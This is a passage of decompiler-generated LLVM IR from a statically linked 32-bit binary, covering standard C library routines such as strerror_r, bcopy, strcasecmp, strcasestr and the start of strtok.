  br i1 %v1_8051f63, label %dec_label_pc_8052001, label %dec_label_pc_8051f6b

dec_label_pc_8051f6b:                             ; preds = %dec_label_pc_8051f5f
  %v12_8051f6b = icmp eq i8 %v2_8051f60, %v2_8051f53
  %v1_8051f6d = icmp eq i1 %v12_8051f6b, false
  br i1 %v1_8051f6d, label %dec_label_pc_8051f5f, label %dec_label_pc_8051f6f

dec_label_pc_8051f6f:                             ; preds = %dec_label_pc_8051f6b
  %v1_8051f6f = add i32 %v4_8051f4b, 1
  %v2_8051f76 = inttoptr i32 %v1_8051f6f to i8*
  %v3_8051f76 = load i8, i8* %v2_8051f76, align 1
  %v1_8051f7d = icmp eq i8 %v3_8051f76, 0
  br i1 %v1_8051f7d, label %dec_label_pc_8052003, label %dec_label_pc_8051f81

dec_label_pc_8051f81:                             ; preds = %dec_label_pc_8051f6f
  %v1_8051f81 = add i32 %v0_8051f5f, 2
  %v1_8051fc2 = add i32 %v4_8051f4b, 2
  %v2_8051fc2 = inttoptr i32 %v1_8051fc2 to i8*
  br label %dec_label_pc_8051fb4

dec_label_pc_8051f8c:                             ; preds = %dec_label_pc_8051ff9
  %v2_8051f8c = inttoptr i32 %v0_8051fc7 to i8*
  %v3_8051f8c = load i8, i8* %v2_8051f8c, align 1
  br label %dec_label_pc_8051fa9.preheader

dec_label_pc_8051fa9.preheader:                   ; preds = %dec_label_pc_8051f8c, %dec_label_pc_8051fb4
  %v0_8051f95.ph.in = phi i8 [ %v0_8051fa927.in, %dec_label_pc_8051fb4 ], [ %v3_8051f8c, %dec_label_pc_8051f8c ]
  %v12_8051fa954 = icmp eq i8 %v0_8051f95.ph.in, %v2_8051f53
  %v1_8051fab55 = icmp eq i1 %v12_8051fa954, false
  br i1 %v1_8051fab55, label %dec_label_pc_8051f95, label %dec_label_pc_8051fad

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051fa9.preheader, %dec_label_pc_8051fa5
  %v0_8051f9557.in = phi i8 [ %v2_8051fa6, %dec_label_pc_8051fa5 ], [ %v0_8051f95.ph.in, %dec_label_pc_8051fa9.preheader ]
  %v0_8051f9956 = phi i32 [ %v1_8051fa5, %dec_label_pc_8051fa5 ], [ %v0_8051fc7, %dec_label_pc_8051fa9.preheader ]
  %v1_8051f95 = icmp eq i8 %v0_8051f9557.in, 0
  br i1 %v1_8051f95, label %dec_label_pc_8052001, label %dec_label_pc_8051f99

dec_label_pc_8051f99:                             ; preds = %dec_label_pc_8051f95
  %v1_8051f99 = add i32 %v0_8051f9956, 1
  %v1_8051f9a = inttoptr i32 %v1_8051f99 to i8*
  %v2_8051f9a = load i8, i8* %v1_8051f9a, align 1
  %v12_8051f9d = icmp eq i8 %v2_8051f9a, %v2_8051f53
  br i1 %v12_8051f9d, label %dec_label_pc_8051fad, label %dec_label_pc_8051fa1

dec_label_pc_8051fa1:                             ; preds = %dec_label_pc_8051f99
  %v1_8051fa1 = icmp eq i8 %v2_8051f9a, 0
  br i1 %v1_8051fa1, label %dec_label_pc_8052001, label %dec_label_pc_8051fa5

dec_label_pc_8051fa5:                             ; preds = %dec_label_pc_8051fa1
  %v1_8051fa5 = add i32 %v0_8051f9956, 2
  %v1_8051fa6 = inttoptr i32 %v1_8051fa5 to i8*
  %v2_8051fa6 = load i8, i8* %v1_8051fa6, align 1
  %v12_8051fa9 = icmp eq i8 %v2_8051fa6, %v2_8051f53
  %v1_8051fab = icmp eq i1 %v12_8051fa9, false
  br i1 %v1_8051fab, label %dec_label_pc_8051f95, label %dec_label_pc_8051fad

dec_label_pc_8051fad:                             ; preds = %dec_label_pc_8051fa5, %dec_label_pc_8051f99, %dec_label_pc_8051fa9.preheader
  %v0_8051fad = phi i32 [ %v0_8051fc7, %dec_label_pc_8051fa9.preheader ], [ %v1_8051f99, %dec_label_pc_8051f99 ], [ %v1_8051fa5, %dec_label_pc_8051fa5 ]
  %v1_8051fad = add i32 %v0_8051fad, 1
  br label %dec_label_pc_8051fb4

dec_label_pc_8051fb4:                             ; preds = %dec_label_pc_8051f81, %dec_label_pc_8051fad
  %v0_8051fa927.in.in.in = phi i32 [ %v1_8051fad, %dec_label_pc_8051fad ], [ %v1_8051f81, %dec_label_pc_8051f81 ]
  %v0_8051fc7 = phi i32 [ %v1_8051fad, %dec_label_pc_8051fad ], [ %v1_8051f81, %dec_label_pc_8051f81 ]
  %v0_8051fa927.in.in = inttoptr i32 %v0_8051fa927.in.in.in to i8*
  %v0_8051fa927.in = load i8, i8* %v0_8051fa927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_8051fa927.in, %v3_8051f76
  %v1_8051fb4 = icmp eq i1 %storemerge4, false
  br i1 %v1_8051fb4, label %dec_label_pc_8051fa9.preheader, label %dec_label_pc_8051fb6

dec_label_pc_8051fb6:                             ; preds = %dec_label_pc_8051fb4
  %v1_8051fbe = add i32 %v0_8051fc7, 1
  %v2_8051fbe = inttoptr i32 %v1_8051fbe to i8*
  %v3_8051fbe = load i8, i8* %v2_8051fbe, align 1
  %v3_8051fc2 = load i8, i8* %v2_8051fc2, align 1
  %v1_8051fca = add i32 %v0_8051fc7, -1
  %v12_8051fcd = icmp eq i8 %v3_8051fbe, %v3_8051fc2
  %v1_8051fcf = icmp eq i1 %v12_8051fcd, false
  br i1 %v1_8051fcf, label %dec_label_pc_8051ff9, label %dec_label_pc_8051fd1.preheader

dec_label_pc_8051fd1.preheader:                   ; preds = %dec_label_pc_8051fb6
  %v1_8051fd110 = icmp eq i8 %v3_8051fbe, 0
  br i1 %v1_8051fd110, label %dec_label_pc_8052003, label %dec_label_pc_8051fd5

dec_label_pc_8051fd5:                             ; preds = %dec_label_pc_8051fd1.preheader, %dec_label_pc_8051ff5
  %v0_8051fe8 = phi i32 [ %v1_8051fe8, %dec_label_pc_8051ff5 ], [ %v1_8051fc2, %dec_label_pc_8051fd1.preheader ]
  %v0_8051fe5 = phi i32 [ %v1_8051fe5, %dec_label_pc_8051ff5 ], [ %v1_8051fbe, %dec_label_pc_8051fd1.preheader ]
  %v1_8051fd5 = add i32 %v0_8051fe5, 1
  %v2_8051fd5 = inttoptr i32 %v1_8051fd5 to i8*
  %v3_8051fd5 = load i8, i8* %v2_8051fd5, align 1
  %v1_8051fd9 = add i32 %v0_8051fe8, 1
  %v2_8051fd9 = inttoptr i32 %v1_8051fd9 to i8*
  %v3_8051fd9 = load i8, i8* %v2_8051fd9, align 1
  %v12_8051fdd = icmp eq i8 %v3_8051fd5, %v3_8051fd9
  %v1_8051fdf = icmp eq i1 %v12_8051fdd, false
  br i1 %v1_8051fdf, label %dec_label_pc_8051ff9, label %dec_label_pc_8051fe1

dec_label_pc_8051fe1:                             ; preds = %dec_label_pc_8051fd5
  %v1_8051fe1 = icmp eq i8 %v3_8051fd9, 0
  br i1 %v1_8051fe1, label %dec_label_pc_8052003, label %dec_label_pc_8051fe5

dec_label_pc_8051fe5:                             ; preds = %dec_label_pc_8051fe1
  %v1_8051fe5 = add i32 %v0_8051fe5, 2
  %v1_8051fe8 = add i32 %v0_8051fe8, 2
  %v1_8051feb = inttoptr i32 %v1_8051fe5 to i8*
  %v2_8051feb = load i8, i8* %v1_8051feb, align 1
  %v1_8051fee = inttoptr i32 %v1_8051fe8 to i8*
  %v2_8051fee = load i8, i8* %v1_8051fee, align 1
  %v12_8051ff1 = icmp eq i8 %v2_8051feb, %v2_8051fee
  %v1_8051ff3 = icmp eq i1 %v12_8051ff1, false
  br i1 %v1_8051ff3, label %dec_label_pc_8051ff9, label %dec_label_pc_8051ff5

dec_label_pc_8051ff5:                             ; preds = %dec_label_pc_8051fe5
  %v1_8051fd1 = icmp eq i8 %v2_8051fee, 0
  br i1 %v1_8051fd1, label %dec_label_pc_8052003, label %dec_label_pc_8051fd5

dec_label_pc_8051ff9:                             ; preds = %dec_label_pc_8051fe5, %dec_label_pc_8051fd5, %dec_label_pc_8051fb6
  %v0_8051ff9.in = phi i8 [ %v3_8051fc2, %dec_label_pc_8051fb6 ], [ %v2_8051fee, %dec_label_pc_8051fe5 ], [ %v3_8051fd9, %dec_label_pc_8051fd5 ]
  %v1_8051ff9 = icmp eq i8 %v0_8051ff9.in, 0
  %v1_8051ffb = icmp eq i1 %v1_8051ff9, false
  br i1 %v1_8051ffb, label %dec_label_pc_8051f8c, label %dec_label_pc_8052003

dec_label_pc_8052001:                             ; preds = %dec_label_pc_8051f5f, %dec_label_pc_8051fa1, %dec_label_pc_8051f95
  br label %dec_label_pc_8052003

dec_label_pc_8052003:                             ; preds = %dec_label_pc_8051fd1.preheader, %dec_label_pc_8051ff9, %dec_label_pc_8051fe1, %dec_label_pc_8051ff5, %entry, %dec_label_pc_8051f6f, %dec_label_pc_8052001
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8052001 ], [ %v1_8051f5f, %dec_label_pc_8051f6f ], [ %arg1, %entry ], [ %v1_8051fca, %dec_label_pc_8051ff5 ], [ %v1_8051fca, %dec_label_pc_8051fe1 ], [ %v1_8051fca, %dec_label_pc_8051ff9 ], [ %v1_8051fca, %dec_label_pc_8051fd1.preheader ]
  store i32 %v0_8051f47, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_8051fee, { 0, 2, 1 }
  uselistorder i32 %v1_8051fe8, { 1, 0 }
  uselistorder i32 %v1_8051fe5, { 1, 0 }
  uselistorder i8 %v3_8051fd9, { 0, 2, 1 }
  uselistorder i8 %v3_8051fbe, { 1, 0 }
  uselistorder i32 %v0_8051fc7, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_8051fad, { 1, 0 }
  uselistorder i8 %v2_8051fa6, { 1, 0 }
  uselistorder i32 %v1_8051fa5, { 0, 2, 1 }
  uselistorder i8 %v2_8051f9a, { 1, 0 }
  uselistorder i32 %v0_8051f9956, { 1, 0 }
  uselistorder i32 %v1_8051f81, { 1, 0 }
  uselistorder i32 %v1_8051f5f, { 0, 2, 1 }
  uselistorder i8 %v2_8051f53, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052003, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_8052001, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051fd5, { 1, 0 }
  uselistorder label %dec_label_pc_8051fb4, { 1, 0 }
  uselistorder label %dec_label_pc_8051f95, { 1, 0 }
  uselistorder label %dec_label_pc_8051fa9.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_805201d = call i32 @__xpg_strerror_r(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_8052022 = load i32, i32* @ebx, align 4
  ret i32 %v0_8052022
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_805203e = icmp ugt i32 %arg1, 124
  br i1 %v6_805203e, label %dec_label_pc_805205b, label %dec_label_pc_8052040

dec_label_pc_8052040:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_80593c0.481 to i32), i32* @esi, align 4
  %v1_80520504 = icmp eq i32 %arg1, 0
  %v1_805205211 = icmp eq i1 %v1_80520504, false
  br i1 %v1_805205211, label %dec_label_pc_8052049, label %dec_label_pc_8052054

dec_label_pc_8052049:                             ; preds = %dec_label_pc_8052040, %dec_label_pc_8052049
  %v0_805204c = phi i32 [ %v3_805204c, %dec_label_pc_8052049 ], [ %arg1, %dec_label_pc_8052040 ]
  %v0_805204f = phi i32 [ %v1_805204f, %dec_label_pc_8052049 ], [ ptrtoint ([8 x i8]* @global_var_80593c0.481 to i32), %dec_label_pc_8052040 ]
  %v1_8052049 = inttoptr i32 %v0_805204f to i8*
  %v2_8052049 = load i8, i8* %v1_8052049, align 1
  %v7_8052049 = icmp eq i8 %v2_8052049, 0
  %v2_805204c = zext i1 %v7_8052049 to i32
  %v3_805204c = add i32 %v2_805204c, %v0_805204c
  %v16_805204c = icmp eq i32 %v3_805204c, 0
  %v1_805204f = add i32 %v0_805204f, 1
  store i32 %v1_805204f, i32* @esi, align 4
  %v1_8052052 = icmp eq i1 %v16_805204c, false
  br i1 %v1_8052052, label %dec_label_pc_8052049, label %dec_label_pc_8052054

dec_label_pc_8052054:                             ; preds = %dec_label_pc_8052049, %dec_label_pc_8052040
  %v0_8052056 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80593c0.481 to i32), %dec_label_pc_8052040 ], [ %v1_805204f, %dec_label_pc_8052049 ]
  store i32 0, i32* @ebp, align 4
  %v1_8052056 = inttoptr i32 %v0_8052056 to i8*
  %v2_8052056 = load i8, i8* %v1_8052056, align 1
  %v3_8052056 = icmp eq i8 %v2_8052056, 0
  %v1_8052059 = icmp eq i1 %v3_8052056, false
  br i1 %v1_8052059, label %dec_label_pc_8052054.dec_label_pc_805208a_crit_edge, label %dec_label_pc_805205b

dec_label_pc_8052054.dec_label_pc_805208a_crit_edge: ; preds = %dec_label_pc_8052054
  br label %dec_label_pc_805208a

dec_label_pc_805205b:                             ; preds = %dec_label_pc_8052054, %entry
  store i32 22, i32* @ebp, align 4
  %v1_8052063 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_805206f = bitcast i32* %stack_var_-17 to i8*
  %v7_805206f = call i32 @_uintmaxtostr(i8* %v6_805206f, i32 %arg1, i32 %v1_8052063, i32 -10, i32 0)
  %v1_8052077 = add i32 %v7_805206f, -14
  store i32 %v1_8052077, i32* @esi, align 4
  %v5_8052081 = inttoptr i32 %v1_8052077 to i8*
  store i8* %v5_8052081, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_8052077 to i16*
  %v6_8052082 = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8059396.482 to i32), i32 14)
  %v0_8052099.pre = load i32, i32* @edi, align 4
  %v0_805209b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805208a

dec_label_pc_805208a:                             ; preds = %dec_label_pc_8052054.dec_label_pc_805208a_crit_edge, %dec_label_pc_805205b
  %v0_805209b = phi i32 [ %v0_8052056, %dec_label_pc_8052054.dec_label_pc_805208a_crit_edge ], [ %v0_805209b.pre, %dec_label_pc_805205b ]
  %v0_8052099 = phi i32 [ %arg3, %dec_label_pc_8052054.dec_label_pc_805208a_crit_edge ], [ %v0_8052099.pre, %dec_label_pc_805205b ]
  %v4_805208c = icmp eq i32 %arg2, 0
  %v1_8052091 = icmp eq i1 %v4_805208c, false
  %v2_8052099 = select i1 %v1_8052091, i32 %v0_8052099, i32 0
  store i32 %v2_8052099, i32* @edi, align 4
  %v5_805209b = inttoptr i32 %v0_805209b to i8*
  store i8* %v5_805209b, i8** %stack_var_-108, align 4
  %v3_805209c = call i32 @strlen(i8* %v5_805209b)
  %v1_80520a4 = add i32 %v3_805209c, 1
  store i32 %v1_80520a4, i32* %ebx.global-to-local, align 4
  %v1_80520a7 = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_80520a4, %v1_80520a7
  br i1 %tmp46, label %dec_label_pc_80520ab, label %dec_label_pc_80520b2

dec_label_pc_80520ab:                             ; preds = %dec_label_pc_805208a
  store i32 %v1_80520a7, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_80520b2

dec_label_pc_80520b2:                             ; preds = %dec_label_pc_805208a, %dec_label_pc_80520ab
  %v0_80520b7 = phi i32 [ %v1_80520a4, %dec_label_pc_805208a ], [ %v1_80520a7, %dec_label_pc_80520ab ]
  %v1_80520b2 = icmp eq i32 %v0_80520b7, 0
  br i1 %v1_80520b2, label %dec_label_pc_80520ce, label %dec_label_pc_80520b6

dec_label_pc_80520b6:                             ; preds = %dec_label_pc_80520b2
  %v0_80520b8 = load i32, i32* @esi, align 4
  %v8_80520b9 = inttoptr i32 %arg2 to i8*
  store i8* %v8_80520b9, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_80520bd = call i32 @memcpy(i16* %tmp45, i32 %v0_80520b8, i32 %v0_80520b7)
  %v1_80520c9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80520c9 = add i32 %arg2, -1
  %v3_80520c9 = add i32 %v2_80520c9, %v1_80520c9
  %v4_80520c9 = inttoptr i32 %v3_80520c9 to i8*
  store i8 0, i8* %v4_80520c9, align 1
  br label %dec_label_pc_80520ce

dec_label_pc_80520ce:                             ; preds = %dec_label_pc_80520b2, %dec_label_pc_80520b6
  %v0_80520ce = load i32, i32* @ebp, align 4
  %v1_80520ce = icmp eq i32 %v0_80520ce, 0
  br i1 %v1_80520ce, label %dec_label_pc_80520d9, label %dec_label_pc_80520d2

dec_label_pc_80520d2:                             ; preds = %dec_label_pc_80520ce
  %v0_80520d2 = load i8*, i8** %stack_var_-108, align 4
  %v1_80520d2 = ptrtoint i8* %v0_80520d2 to i32
  %v2_80520d2 = call i32 @__errno_location(i32 %v1_80520d2)
  %v0_80520d7 = load i32, i32* @ebp, align 4
  %v2_80520d7 = inttoptr i32 %v2_80520d2 to i32*
  store i32 %v0_80520d7, i32* %v2_80520d7, align 4
  %v0_80520dc.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_80520d9

dec_label_pc_80520d9:                             ; preds = %dec_label_pc_80520ce, %dec_label_pc_80520d2
  %v0_80520dc = phi i32 [ 0, %dec_label_pc_80520ce ], [ %v0_80520dc.pre, %dec_label_pc_80520d2 ]
  ret i32 %v0_80520dc

; uselistorder directives
  uselistorder i32 %v1_80520a7, { 1, 2, 0 }
  uselistorder i32 %v1_80520a4, { 1, 0, 2 }
  uselistorder i32 %v1_8052077, { 1, 0, 2 }
  uselistorder i32 %v1_805204f, { 0, 2, 1 }
  uselistorder i32 %v3_805204c, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_80593c0.481 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_80520d9, { 1, 0 }
  uselistorder label %dec_label_pc_80520ce, { 1, 0 }
  uselistorder label %dec_label_pc_80520b2, { 1, 0 }
  uselistorder label %dec_label_pc_805208a, { 1, 0 }
  uselistorder label %dec_label_pc_8052049, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_80520f4 = inttoptr i32 %arg2 to i8*
  %v3_80520f4 = call i32 @memmove(i8* %v2_80520f4, i32 %arg1)
  ret i32 %v3_80520f4
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80520fe = ptrtoint i8* %arg1 to i32
  store i32 %v4_80520fe, i32* @ecx, align 4
  %v0_8052108 = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
  br label %dec_label_pc_805210e

dec_label_pc_805210e:                             ; preds = %dec_label_pc_805212b, %entry
  %v0_80521316 = phi i32 [ %v0_80521317, %dec_label_pc_805212b ], [ 0, %entry ]
  %v0_805212b = phi i32 [ %v1_805212b, %dec_label_pc_805212b ], [ %arg2, %entry ]
  %v0_805212c = phi i32 [ %v1_805212c, %dec_label_pc_805212b ], [ %v4_80520fe, %entry ]
  %v12_805210e = icmp eq i32 %v0_805212c, %v0_805212b
  %.pre = inttoptr i32 %v0_805212c to i8*
  br i1 %v12_805210e, label %dec_label_pc_8052126, label %dec_label_pc_8052112

dec_label_pc_8052112:                             ; preds = %dec_label_pc_805210e
  %v2_8052112 = load i8, i8* %.pre, align 1
  %v3_8052112 = zext i8 %v2_8052112 to i32
  %v2_8052115 = mul nuw nsw i32 %v3_8052112, 2
  %v3_8052115 = add i32 %v2_8052115, %v0_8052108
  %v4_8052115 = inttoptr i32 %v3_8052115 to i16*
  %v5_8052115 = load i16, i16* %v4_8052115, align 2
  %v6_8052115 = sext i16 %v5_8052115 to i32
  %v1_8052119 = inttoptr i32 %v0_805212b to i8*
  %v2_8052119 = load i8, i8* %v1_8052119, align 1
  %v3_8052119 = zext i8 %v2_8052119 to i32
  %v2_805211c = mul nuw nsw i32 %v3_8052119, 2
  %v3_805211c = add i32 %v2_805211c, %v0_8052108
  %v4_805211c = inttoptr i32 %v3_805211c to i16*
  %v5_805211c = load i16, i16* %v4_805211c, align 2
  %v6_805211c = sext i16 %v5_805211c to i32
  %v2_8052120 = sub nsw i32 %v6_8052115, %v6_805211c
  %v12_8052120 = icmp eq i32 %v2_8052120, 0
  store i32 %v2_8052120, i32* @edx, align 4
  %v1_8052124 = icmp eq i1 %v12_8052120, false
  br i1 %v1_8052124, label %dec_label_pc_805212f, label %dec_label_pc_8052126

dec_label_pc_8052126:                             ; preds = %dec_label_pc_805210e, %dec_label_pc_8052112
  %v0_80521317 = phi i32 [ %v2_8052120, %dec_label_pc_8052112 ], [ %v0_80521316, %dec_label_pc_805210e ]
  %v2_8052126 = load i8, i8* %.pre, align 1
  %v3_8052126 = icmp eq i8 %v2_8052126, 0
  br i1 %v3_8052126, label %dec_label_pc_805212f, label %dec_label_pc_805212b

dec_label_pc_805212b:                             ; preds = %dec_label_pc_8052126
  %v1_805212b = add i32 %v0_805212b, 1
  %v1_805212c = add i32 %v0_805212c, 1
  store i32 %v1_805212c, i32* @ecx, align 4
  br label %dec_label_pc_805210e

dec_label_pc_805212f:                             ; preds = %dec_label_pc_8052126, %dec_label_pc_8052112
  %v0_8052131 = phi i32 [ %v0_80521317, %dec_label_pc_8052126 ], [ %v2_8052120, %dec_label_pc_8052112 ]
  ret i32 %v0_8052131

; uselistorder directives
  uselistorder i32 %v1_805212c, { 1, 0 }
  uselistorder i32 %v0_80521317, { 1, 0 }
  uselistorder i32 %v2_8052120, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805212c, { 2, 1, 0 }
  uselistorder i32 %v0_805212b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052126, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8052137 = load i32, i32* @ebx, align 4
  %v4_805213b = ptrtoint i8* %arg1 to i32
  %v1_805214718 = inttoptr i32 %arg2 to i8*
  %v2_80521471931 = load i8, i8* %v1_805214718, align 1
  %v4_80521492335 = icmp eq i8 %v2_80521471931, 0
  %v1_805214b2436 = icmp eq i1 %v4_80521492335, false
  br i1 %v1_805214b2436, label %dec_label_pc_8052151.lr.ph.lr.ph, label %dec_label_pc_8052181

dec_label_pc_8052151.lr.ph.lr.ph:                 ; preds = %entry
  %v3_80521472032 = zext i8 %v2_80521471931 to i32
  %v4_8052147.pre.pre = load i32, i32* @eax, align 4
  %v5_80521472133 = and i32 %v4_8052147.pre.pre, -256
  %v6_80521472234 = or i32 %v3_80521472032, %v5_80521472133
  %v4_8052151.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052151.lr.ph

dec_label_pc_8052151.lr.ph:                       ; preds = %dec_label_pc_8052151.lr.ph.lr.ph, %dec_label_pc_805217c
  %v4_8052151.pre = phi i32 [ %v4_8052151.pre.pre, %dec_label_pc_8052151.lr.ph.lr.ph ], [ %v0_805215e, %dec_label_pc_805217c ]
  %v6_80521472239 = phi i32 [ %v6_80521472234, %dec_label_pc_8052151.lr.ph.lr.ph ], [ %v6_805214722, %dec_label_pc_805217c ]
  %v2_80521471938 = phi i8 [ %v2_80521471931, %dec_label_pc_8052151.lr.ph.lr.ph ], [ %v2_805214719, %dec_label_pc_805217c ]
  %v0_805217c37 = phi i32 [ %v4_805213b, %dec_label_pc_8052151.lr.ph.lr.ph ], [ %v1_805217c, %dec_label_pc_805217c ]
  br label %dec_label_pc_8052151

dec_label_pc_8052151:                             ; preds = %dec_label_pc_8052151.lr.ph, %dec_label_pc_8052171
  %v4_8052151 = phi i32 [ %v4_8052151.pre, %dec_label_pc_8052151.lr.ph ], [ %v4_805215144, %dec_label_pc_8052171 ]
  %v6_805214729 = phi i32 [ %v6_80521472239, %dec_label_pc_8052151.lr.ph ], [ %v6_8052147, %dec_label_pc_8052171 ]
  %v2_805214728 = phi i8 [ %v2_80521471938, %dec_label_pc_8052151.lr.ph ], [ %v2_8052147, %dec_label_pc_8052171 ]
  %v1_805214727 = phi i8* [ %v1_805214718, %dec_label_pc_8052151.lr.ph ], [ %v1_8052147, %dec_label_pc_8052171 ]
  %v0_805217126 = phi i32 [ %arg2, %dec_label_pc_8052151.lr.ph ], [ %v1_8052171, %dec_label_pc_8052171 ]
  %v0_805217225 = phi i32 [ %v0_805217c37, %dec_label_pc_8052151.lr.ph ], [ %v1_8052172, %dec_label_pc_8052171 ]
  %v1_8052151 = inttoptr i32 %v0_805217225 to i8*
  %v2_8052151 = load i8, i8* %v1_8052151, align 1
  %v3_8052151 = zext i8 %v2_8052151 to i32
  %v5_8052151 = and i32 %v4_8052151, -256
  %v6_8052151 = or i32 %v5_8052151, %v3_8052151
  %v15_8052157 = icmp eq i8 %v2_805214728, %v2_8052151
  br i1 %v15_8052157, label %dec_label_pc_8052171, label %dec_label_pc_805215b

dec_label_pc_805215b:                             ; preds = %dec_label_pc_8052151
  %v2_805215b = load i8, i8* %v1_8052151, align 1
  %v3_805215b = zext i8 %v2_805215b to i32
  %v0_805215e = load i32, i32* bitcast (i32** @global_var_805b500.484 to i32*), align 256
  %v2_8052164 = load i8, i8* %v1_805214727, align 1
  %v3_8052164 = zext i8 %v2_8052164 to i32
  %v2_8052167 = mul nuw nsw i32 %v3_805215b, 2
  %v3_8052167 = add i32 %v2_8052167, %v0_805215e
  %v4_8052167 = inttoptr i32 %v3_8052167 to i16*
  %v5_8052167 = load i16, i16* %v4_8052167, align 2
  %v6_8052167 = zext i16 %v5_8052167 to i32
  %v4_805216b = mul nuw nsw i32 %v3_8052164, 2
  %v5_805216b = add i32 %v4_805216b, %v0_805215e
  %v6_805216b = inttoptr i32 %v5_805216b to i16*
  %v7_805216b = load i16, i16* %v6_805216b, align 2
  %v18_805216b = icmp eq i16 %v5_8052167, %v7_805216b
  %v1_805216f = icmp eq i1 %v18_805216b, false
  br i1 %v1_805216f, label %dec_label_pc_8052175, label %dec_label_pc_8052171

dec_label_pc_8052171:                             ; preds = %dec_label_pc_805215b, %dec_label_pc_8052151
  %v4_805215144 = phi i32 [ %v0_805215e, %dec_label_pc_805215b ], [ %v6_8052151, %dec_label_pc_8052151 ]
  %v4_80521476 = phi i32 [ %v6_8052167, %dec_label_pc_805215b ], [ %v6_805214729, %dec_label_pc_8052151 ]
  %v1_8052171 = add i32 %v0_805217126, 1
  %v1_8052172 = add i32 %v0_805217225, 1
  %v1_8052147 = inttoptr i32 %v1_8052171 to i8*
  %v2_8052147 = load i8, i8* %v1_8052147, align 1
  %v3_8052147 = zext i8 %v2_8052147 to i32
  %v5_8052147 = and i32 %v4_80521476, -256
  %v6_8052147 = or i32 %v3_8052147, %v5_8052147
  %v4_8052149 = icmp eq i8 %v2_8052147, 0
  %v1_805214b = icmp eq i1 %v4_8052149, false
  br i1 %v1_805214b, label %dec_label_pc_8052151, label %dec_label_pc_8052181

dec_label_pc_8052175:                             ; preds = %dec_label_pc_805215b
  %v4_8052175 = icmp eq i8 %v2_8052151, 0
  br i1 %v4_8052175, label %dec_label_pc_805217f, label %dec_label_pc_805217c

dec_label_pc_805217c:                             ; preds = %dec_label_pc_8052175
  %v1_805217c = add i32 %v0_805217c37, 1
  %v2_805214719 = load i8, i8* %v1_805214718, align 1
  %v3_805214720 = zext i8 %v2_805214719 to i32
  %v5_805214721 = and i32 %v6_8052167, 65280
  %v6_805214722 = or i32 %v3_805214720, %v5_805214721
  %v4_805214923 = icmp eq i8 %v2_805214719, 0
  %v1_805214b24 = icmp eq i1 %v4_805214923, false
  br i1 %v1_805214b24, label %dec_label_pc_8052151.lr.ph, label %dec_label_pc_8052181

dec_label_pc_805217f:                             ; preds = %dec_label_pc_8052175
  br label %dec_label_pc_8052181

dec_label_pc_8052181:                             ; preds = %dec_label_pc_805217c, %entry, %dec_label_pc_8052171, %dec_label_pc_805217f
  %storemerge = phi i32 [ 0, %dec_label_pc_805217f ], [ %v4_805213b, %entry ], [ %v1_805217c, %dec_label_pc_805217c ], [ %v0_805217c37, %dec_label_pc_8052171 ]
  store i32 %v0_8052137, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805214719, { 1, 2, 0 }
  uselistorder i8 %v2_8052147, { 1, 2, 0 }
  uselistorder i8* %v1_8052147, { 1, 0 }
  uselistorder i32 %v0_805215e, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805217225, { 1, 0 }
  uselistorder i8 %v2_80521471931, { 0, 2, 1 }
  uselistorder i8* %v1_805214718, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052181, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8052151, { 1, 0 }
  uselistorder label %dec_label_pc_8052151.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8052198 = inttoptr i32 %arg1 to i8*
